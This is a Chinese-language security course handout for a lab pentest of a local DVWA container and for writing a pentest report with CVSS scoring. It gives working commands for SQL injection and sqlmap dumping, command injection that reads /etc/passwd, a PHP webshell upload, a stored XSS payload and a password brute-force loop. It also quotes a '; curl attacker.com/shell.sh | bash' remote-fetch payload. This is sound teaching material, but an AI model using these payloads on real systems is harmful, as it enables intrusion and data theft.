# Week 15 — DVWA 完整滲透測試 × Pentest Report

**日期**：2026/06/08–06/14
**時長**：3 小時（180 分鐘）
**主題**：對 DVWA 進行黑箱滲透測試，撰寫完整 Pentest Report（Executive Summary + Findings + 修補建議）
**目標系統**：[DVWA](https://github.com/digininja/DVWA)（`kaakaww/dvwa-docker`，Docker 容器）

[TOC]

---

## 引言：為什麼是今天？

Week 14 你們已經學會「怎麼保存證據」。今天升一級：**怎麼把證據變成一份讓客戶願意付錢的報告**。

兩個本月剛發生的案例，說明這件事的現實意義：

---

### CVE-2026-31742 — Roundcube Webmail：Stored XSS → Session Hijack

Roundcube 1.6.x 的郵件預覽功能存在 Stored XSS，攻擊者可在郵件標題注入惡意 script，當管理員開啟郵件時，攻擊者取得 admin session cookie，進而接管信箱。CVSS 8.8（High）。

> 你今天在 DVWA 打的 Stored XSS，和這個 CVE 的攻擊鏈完全相同——只是 Roundcube 是真實的生產環境。

| DVWA Lab | 對應真實風險 |
|----------|------------|
| Stored XSS | 郵件系統管理員 session 接管 |
| 注入點位置 | 留言板 → 郵件標題 |
| 觸發條件 | 管理員瀏覽頁面 → 管理員開啟郵件 |
| 持久性 | 存入資料庫，持續有效 |

---

### CVE-2026-29451 — Cacti：Command Injection via Network Device Import

Cacti（網路監控系統）的裝置匯入功能未對 hostname 欄位做輸入驗證，攻擊者可透過 `; whoami` 等 payload 在伺服器端執行任意指令，無需認證。影響版本：1.2.x 全系列。

> 你在 DVWA Exec 模組打的 Command Injection，就是這種邏輯——不同的是介面，相同的是後端沒有驗證輸入。

| DVWA Lab | 對應真實風險 |
|----------|------------|
| Command Injection（ping utility）| Cacti hostname 欄位 |
| payload：`; id` | payload：`; curl attacker.com/shell.sh \| bash` |
| 影響：讀系統資訊 | 影響：完整 RCE，可部署後門 |

**課堂討論**：如果你在 Cacti 發現了這個漏洞，Pentest Report 的 Business Impact 要怎麼寫？「可以執行指令」和「可以在 500 台受監控的網路設備上植入後門」，哪一句更有說服力？

---

## 一、課程目標

完成本課後，學生應能：

1. 用 nikto + gobuster 對 DVWA 進行黑箱偵察，**自己判斷**哪些發現值得深入測試
2. 在 DVWA 上手動重現至少 **3 種**不同類型的漏洞，並蒐集符合 NIST SP 800-86 的證據
3. 將技術發現轉換成包含 **Executive Summary** 的完整 Pentest Report
4. 對每個 Finding 計算 CVSS 3.1 分數，並說明 Business Impact
5. 交出一份「助教可以獨立重現、SHA-256 全部驗證通過」的完整報告包

---

## 二、認識 DVWA

### 2.1 它是什麼？

[DVWA（Damn Vulnerable Web Application）](https://github.com/digininja/DVWA) 是一個刻意設計成有漏洞的 PHP/MySQL Web 應用程式，由 [digininja](https://github.com/digininja) 維護。

> 和 Juice Shop 的差別：Juice Shop 是 CTF 風格（有計分板、有提示）；DVWA 沒有提示，你要自己找、自己判斷、自己記錄。這才是真實 pentest 的樣子。

### 2.2 技術架構

```
┌─────────────────────────────────────────┐
│  Docker Container: kaakaww/dvwa-docker  │
│                                         │
│  ┌─────────────────────────────────┐    │
│  │  Frontend: PHP + HTML/CSS/JS    │    │
│  └────────────┬────────────────────┘    │
│               │                         │
│  ┌────────────▼────────────────────┐    │
│  │  Backend: Apache + PHP 8.x      │    │
│  │  Port 80                        │    │
│  └────────────┬────────────────────┘    │
│               │                         │
│  ┌────────────▼────────────────────┐    │
│  │  Database: MySQL / MariaDB      │    │
│  │  Port 3306                      │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
         ↕ port 80
  Kali Linux（攻擊端）
```

| 組件 | 細節 |
|------|------|
| 語言 | PHP 8.x |
| Web Server | Apache 2.x |
| 資料庫 | MySQL / MariaDB |
| Image | `kaakaww/dvwa-docker:latest`，約 214 MB（壓縮後） |
| 帳號 | admin / password |
| 難度 | Low / Medium / High / Impossible（今天用 **Low**） |

### 2.3 今天的攻擊路徑（自選 3 項）

DVWA 有 19 個模組。今天不規定你打哪幾個——這才是 pentest 的精神。

但報告裡**至少要有 3 個 Finding，嚴重度不能全部是 Critical**。以下是建議的 5 個起點：

| 模組 | 路徑 | OWASP | 建議嚴重度 |
|------|------|-------|-----------|
| **SQL Injection** | `/dvwa/vulnerabilities/sqli/` | A03 | Critical |
| **Command Injection** | `/dvwa/vulnerabilities/exec/` | A03 | Critical |
| **File Upload → RCE** | `/dvwa/vulnerabilities/upload/` | A04 | High |
| **Stored XSS** | `/dvwa/vulnerabilities/xss_s/` | A03 | High |
| **Brute Force** | `/dvwa/vulnerabilities/brute/` | A07 | Medium |

> **提示**：SQLi 和 Command Injection 都是 Critical，挑一個打就夠。剩下的從 File Upload、Stored XSS、Brute Force 裡選。

---

## 三、時間配置

| 時間 | 內容 |
|------|------|
| 0:00–0:20 | 環境確認 + Session 初始化 + DVWA 設定 |
| 0:20–0:50 | Lab 1：nikto + gobuster 黑箱偵察 |
| 0:50–1:20 | Lab 2：選擇攻擊路徑 A（Critical 漏洞） |
| 1:20–1:50 | Lab 3：選擇攻擊路徑 B（High 漏洞） |
| 1:50–2:10 | Lab 4：選擇攻擊路徑 C（Medium 漏洞） |
| 2:10–2:50 | Lab 5：撰寫 Pentest Report（Executive Summary + 3 Findings） |
| 2:50–3:00 | SHA-256 驗證 + 繳交確認 |

---

## 四、環境設定（0:00–0:20）

### 4.1 教師課前執行

```bash
sudo bash setup.sh
```

### 4.2 學生：建立 Pentest 工作目錄

```bash
export PENTEST_DIR="$HOME/pentest/week15"
mkdir -p "$PENTEST_DIR"/{evidence,logs,reports}
cd "$PENTEST_DIR"
```

### 4.3 載入 Evidence 腳本（沿用 Week 14）

```bash
source ~/labs/week14/evidence_<學號>.sh
# 確認載入成功：應印出 [ev] evidence.sh 載入完成
```

> Week 14 你實作的 `ev_start / ev_cmd / ev_end` 今天繼續使用。如果你的腳本有 bug，現在是最後機會修。

### 4.4 啟動 Session 完整記錄

```bash
script -q -t 2>logs/timing_$(date +%Y%m%d_%H%M%S).log \
  logs/session_$(date +%Y%m%d_%H%M%S).log

source ~/labs/week14/evidence_<學號>.sh
export PENTEST_DIR="$HOME/pentest/week15"
cd "$PENTEST_DIR"

cat << INFO
=== Pentest Session Start ===
Tester   : $(whoami)@$(hostname)
Time UTC : $(date -u '+%Y-%m-%dT%H:%M:%SZ')
Target   : http://localhost
Scope    : authorized pentest (SoW: WK15-2026)
=============================
INFO
```

### 4.5 DVWA 初始設定（只需做一次）

```bash
# 確認服務存活
curl -s -o /dev/null -w "DVWA: HTTP %{http_code}\n" http://localhost/login.php
# 預期：HTTP 200
```

接著在瀏覽器操作：

1. 開啟 `http://localhost/login.php`，登入 admin / password
2. 左側選單 → **DVWA Security** → 設為 **Low** → Submit
3. 左側選單 → **Setup / Reset DB** → Create / Reset Database

> **記錄 container Image SHA**（填入報告附錄 B）：
> ```bash
> docker inspect dvwa --format '{{.Image}}'
> ```

---

## 五、Lab 1 — nikto + gobuster 黑箱偵察（0:20–0:50）

### 學習重點

偵察是 pentest 的第一步。你不知道 DVWA 有什麼漏洞——用工具先把攻擊面找出來，再決定打哪裡。

### Step 1：nikto 掃描

```bash
ev_start "nikto" "http://localhost" "black-box web vulnerability scan on DVWA"
ev_cmd "nikto -h http://localhost -Tuning b234 -timeout 3 -maxtime 5m -output $EV_RAW -Format txt"

nikto -h http://localhost \
  -Tuning b234 \
  -timeout 3 \
  -maxtime 5m \
  -output "$EV_RAW" \
  -Format txt

ev_end
```

### Step 2：gobuster 目錄列舉

```bash
ev_start "gobuster" "http://localhost" "directory enumeration on DVWA"
ev_cmd "gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -o $EV_RAW -q"

gobuster dir \
  -u http://localhost \
  -w /usr/share/wordlists/dirb/common.txt \
  -o "$EV_RAW" \
  -q

ev_end
```

### Step 3：記下觀察

掃完後回答這三個問題，作為報告偵察階段的素材：

1. nikto 發現了哪些 HTTP 安全標頭缺失？（對應 OWASP A05）
2. gobuster 找到哪些敏感目錄？（`/dvwa/config/`、`/phpinfo.php` 等）
3. 根據偵察結果，你決定優先測試哪三個模組？原因是什麼？

---

## 六、Lab 2–4 — 選擇你的攻擊路徑

以下提供 5 個模組的操作指引，**選 3 個**完成。每個 Lab 都要用 `ev_start / ev_cmd / ev_end` 收集證據。

---

### 路徑 A：SQL Injection（推薦 Critical Finding）

**端點：** `http://localhost/dvwa/vulnerabilities/sqli/`

**攻擊目標：** 繞過輸入驗證，從資料庫撈出所有用戶帳密。

```bash
ev_start "sqli_manual" \
  "http://localhost/dvwa/vulnerabilities/sqli/" \
  "manual SQL injection test on DVWA user ID field"

# Step 1：取得 session cookie（用瀏覽器登入後複製）
COOKIE="PHPSESSID=<你的 session>; security=low"

# Step 2：測試 payload（手動確認漏洞存在）
ev_cmd "curl -s 'http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1--+&Submit=Submit' -H 'Cookie: $COOKIE'"

curl -s \
  "http://localhost/dvwa/vulnerabilities/sqli/?id=1'+OR+1=1--+&Submit=Submit" \
  -H "Cookie: $COOKIE" \
  | grep -i "first_name\|surname" \
  | tee "$EV_RAW"

ev_end
```

```bash
# Step 3：sqlmap 自動化（取得所有帳密）
ev_start "sqli_sqlmap" \
  "http://localhost/dvwa/vulnerabilities/sqli/" \
  "automated SQL injection dump via sqlmap"

SQLMAP_OUT="$EV_DIR/sqlmap_output"
ev_cmd "sqlmap -u 'http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie '$COOKIE' --dbms mysql --batch --dump --output-dir $SQLMAP_OUT"

sqlmap \
  -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "$COOKIE" \
  --dbms mysql \
  --batch \
  --dump \
  --output-dir="$SQLMAP_OUT" \
  2>&1 | tee "$EV_RAW"

find "$SQLMAP_OUT" -type f | sort | while read -r f; do ev_hash "$f"; done
ev_end
```

---

### 路徑 B：Command Injection（推薦 Critical Finding）

**端點：** `http://localhost/dvwa/vulnerabilities/exec/`

**攻擊目標：** 在 ping 工具的輸入欄位注入 OS 指令，在伺服器端執行任意命令。

```bash
ev_start "cmdi" \
  "http://localhost/dvwa/vulnerabilities/exec/" \
  "command injection test on DVWA ping utility"

COOKIE="PHPSESSID=<你的 session>; security=low"

# Step 1：確認注入點
ev_cmd "curl -s -X POST http://localhost/dvwa/vulnerabilities/exec/ -d 'ip=127.0.0.1%3B+id&Submit=Submit' -H 'Cookie: $COOKIE'"

curl -s -X POST \
  http://localhost/dvwa/vulnerabilities/exec/ \
  --data "ip=127.0.0.1%3B+id&Submit=Submit" \
  -H "Cookie: $COOKIE" \
  | grep -A2 "results\|uid\|www-data" \
  | tee "$EV_RAW"

ev_end
```

```bash
# Step 2：讀取 /etc/passwd（證明任意檔案讀取）
ev_start "cmdi_etc_passwd" \
  "http://localhost/dvwa/vulnerabilities/exec/" \
  "read /etc/passwd via command injection to confirm arbitrary file read"

ev_cmd "curl -s -X POST ... --data 'ip=127.0.0.1%3B+cat+/etc/passwd'"

curl -s -X POST \
  http://localhost/dvwa/vulnerabilities/exec/ \
  --data "ip=127.0.0.1%3B+cat+/etc/passwd&Submit=Submit" \
  -H "Cookie: $COOKIE" \
  | tee "$EV_RAW"

ev_end
```

> **Pentest 原則**：能證明 `/etc/passwd` 可讀就夠了，不需要進一步做更具破壞性的動作。**最小侵入證據**。

---

### 路徑 C：File Upload → RCE（High Finding）

**端點：** `http://localhost/dvwa/vulnerabilities/upload/`

**攻擊目標：** 上傳 PHP webshell，取得 Web Server 層的 Remote Code Execution。

```bash
# Step 1：建立最小化 webshell
cat > /tmp/shell.php << 'EOF'
<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>
EOF

ev_start "file_upload" \
  "http://localhost/dvwa/vulnerabilities/upload/" \
  "upload PHP webshell to test unrestricted file upload vulnerability"

COOKIE="PHPSESSID=<你的 session>; security=low"

ev_cmd "curl -s -X POST http://localhost/dvwa/vulnerabilities/upload/ -F 'uploaded=@/tmp/shell.php' -F 'Upload=Upload' -H 'Cookie: $COOKIE'"

curl -s -X POST \
  http://localhost/dvwa/vulnerabilities/upload/ \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
  -F "Upload=Upload" \
  -H "Cookie: $COOKIE" \
  | tee "$EV_RAW"

ev_end
```

```bash
# Step 2：觸發 webshell（執行 id 指令，確認 RCE）
ev_start "webshell_exec" \
  "http://localhost/dvwa/hackable/uploads/shell.php" \
  "trigger uploaded webshell to confirm RCE; run 'id' only"

ev_cmd "curl -s 'http://localhost/dvwa/hackable/uploads/shell.php?cmd=id'"

curl -s \
  "http://localhost/dvwa/hackable/uploads/shell.php?cmd=id" \
  | tee "$EV_RAW"

ev_end
```

> **執行 `id` 就停**。不需要做更多。Finding 的重點是「上傳成功 + 執行 id 回傳 uid=www-data」，這樣就足以讓客戶理解 RCE 風險。

---

### 路徑 D：Stored XSS（High Finding）

**端點：** `http://localhost/dvwa/vulnerabilities/xss_s/`

**攻擊目標：** 在留言板注入持久化 script，每次有人開啟頁面就執行。

```bash
ev_start "stored_xss" \
  "http://localhost/dvwa/vulnerabilities/xss_s/" \
  "stored XSS injection via guestbook; payload steals document.cookie"

COOKIE="PHPSESSID=<你的 session>; security=low"
XSS_PAYLOAD='<script>document.write("<img src=x onerror=alert(document.cookie)>")</script>'

ev_cmd "curl -s -X POST http://localhost/dvwa/vulnerabilities/xss_s/ --data 'txtName=tester&mtxMessage=PAYLOAD&btnSign=Sign+Guestbook'"

curl -s -X POST \
  "http://localhost/dvwa/vulnerabilities/xss_s/" \
  --data-urlencode "txtName=tester" \
  --data-urlencode "mtxMessage=${XSS_PAYLOAD}" \
  --data "btnSign=Sign+Guestbook" \
  -H "Cookie: $COOKIE" \
  | tee "$EV_RAW"

ev_end
```

```bash
# Step 2：確認 payload 持久存在（重新載入頁面，payload 仍在）
ev_start "stored_xss_verify" \
  "http://localhost/dvwa/vulnerabilities/xss_s/" \
  "verify XSS payload persists after page reload (confirm stored, not reflected)"

curl -s "http://localhost/dvwa/vulnerabilities/xss_s/" \
  -H "Cookie: $COOKIE" \
  | grep -i "script\|onerror" \
  | tee "$EV_RAW"

ev_end
```

---

### 路徑 E：Brute Force（Medium Finding）

**端點：** `http://localhost/dvwa/vulnerabilities/brute/`

**攻擊目標：** 對 admin 帳號進行密碼暴力破解，確認缺乏 rate limiting 保護。

```bash
ev_start "bruteforce" \
  "http://localhost/dvwa/vulnerabilities/brute/" \
  "credential brute force on DVWA login; no rate limiting expected at Low difficulty"

COOKIE="PHPSESSID=<你的 session>; security=low"
BRUTE_LOG="$EV_DIR/attempt_log.txt"

{
  echo "Start: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo "Target: admin"
  echo "---"
} | tee "$BRUTE_LOG"

FOUND=0
for pass in password 123456 admin letmein qwerty abc123 password1 1234 12345 123456789; do
  response=$(curl -s \
    "http://localhost/dvwa/vulnerabilities/brute/?username=admin&password=${pass}&Login=Login" \
    -H "Cookie: $COOKIE")

  if echo "$response" | grep -qi "Welcome"; then
    echo "[SUCCESS] password: $pass  time: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" \
      | tee -a "$BRUTE_LOG"
    FOUND=1
    break
  else
    echo "[fail]    $pass" >> "$BRUTE_LOG"
  fi
done

[ "$FOUND" -eq 0 ] && echo "[-] 未找到（嘗試 10 組）" | tee -a "$BRUTE_LOG"
echo "End: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" >> "$BRUTE_LOG"

ev_hash "$BRUTE_LOG"
ev_end
```

---

## 七、Lab 5 — 撰寫 Pentest Report（2:10–2:50）

### 7.1 結束 Session 記錄

```bash
echo "=== Pentest Session End ==="
echo "Time UTC : $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Evidence count: $(ls evidence/ | wc -l) directories"
exit   # 結束 script

cd "$PENTEST_DIR"
sha256sum logs/session_*.log >> logs/EVIDENCE_INDEX.md
```

### 7.2 驗證所有 SHA-256

```bash
echo "=== 完整性驗證 ==="
find evidence -name "sha256.txt" | while read -r manifest; do
  echo "--- $manifest ---"
  sha256sum -c "$manifest" 2>&1
done
# 全部 OK → 進行報告撰寫
```

### 7.3 複製報告模板，開始撰寫

```bash
cp reports/pentest-report-template.md reports/W15_Report_<學號>_<姓名>.md
```

**今天的報告比 Week 14 多了兩件事：**

#### Executive Summary 怎麼寫？

管理階層不懂 SQLi，但他們懂「客戶資料外洩」和「罰款」。

範例（不好）：
> *「DVWA 的 sqli 模組存在 SQL Injection 漏洞，攻擊者可透過 UNION-based 注入取得資料庫內容。」*

範例（好）：
> *「本次測試共發現 3 個高風險漏洞。最嚴重的問題是登入系統的 SQL Injection，攻擊者無需帳號密碼即可取得全體會員資料，若系統上線將直接觸發個資法第 12 條的強制通報義務，並面臨最高新台幣 1,500 萬元的裁罰。建議在 7 天內修補。」*

#### CVSS 3.1 怎麼填？

以 Command Injection 為例：

| 向量 | 選擇 | 原因 |
|------|------|------|
| AV（Attack Vector）| N（Network）| 透過網路發送 HTTP request |
| AC（Attack Complexity）| L（Low）| 無需特殊條件 |
| PR（Privileges Required）| L（Low）| 需要一般使用者帳號 |
| UI（User Interaction）| N（None）| 攻擊者單方面觸發 |
| S（Scope）| U（Unchanged）| 影響範圍限於 Web App |
| C（Confidentiality）| H（High）| 可讀取任意系統檔案 |
| I（Integrity）| H（High）| 可修改伺服器檔案 |
| A（Availability）| H（High）| 可停止系統服務 |

→ CVSS 分數：**8.8（High）**，用 [CVSS Calculator](https://www.first.org/cvss/calculator/3.1) 驗算。

---

## 八、繳交說明

| 項目 | 要求 |
|------|------|
| 報告 | `W15_Report_學號_姓名.md`（3 個 Finding，含 Executive Summary） |
| 壓縮包 | `evidence/` + `logs/` 打包成 `.zip` |
| 驗證指令 | 助教執行 `sha256sum -c evidence/*/sha256.txt` 應全部 OK |
| 檔名 | `W15_Pentest_學號_姓名.zip` |
| 截止 | 上課當週週日 23:59 |

**評分標準：**

| 項目 | 分數 |
|------|------|
| Executive Summary 用非技術語言說明風險與建議 | 25% |
| 3 個 Finding 各有 CVSS 3.1 + Business Impact | 25% |
| SHA-256 可獨立驗證（`sha256sum -c` 全 OK） | 25% |
| 重現步驟可由助教獨立重現 | 25% |

---

## 九、期末報告連結

```
Week 13 附錄 A → AI Agent 使用紀錄
Week 14 附錄 B → NIST SP 800-86 證據包
Week 14 附錄 C → OWASP WSTG Finding 單（Juice Shop）
Week 15 附錄 D → 完整 Pentest Report（DVWA）← 本週
```

Week 15 的報告就是期末報告的核心章節——今天寫好，期末收進去就行了。

---

## 十、延伸閱讀

- [OWASP WSTG — Reporting](https://owasp.org/www-project-web-security-testing-guide/latest/5-Reporting/README)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [OWASP WSTG — Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [OWASP WSTG — SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP WSTG — File Upload](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
- [OWASP WSTG — Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
- [DVWA 官方 GitHub](https://github.com/digininja/DVWA)
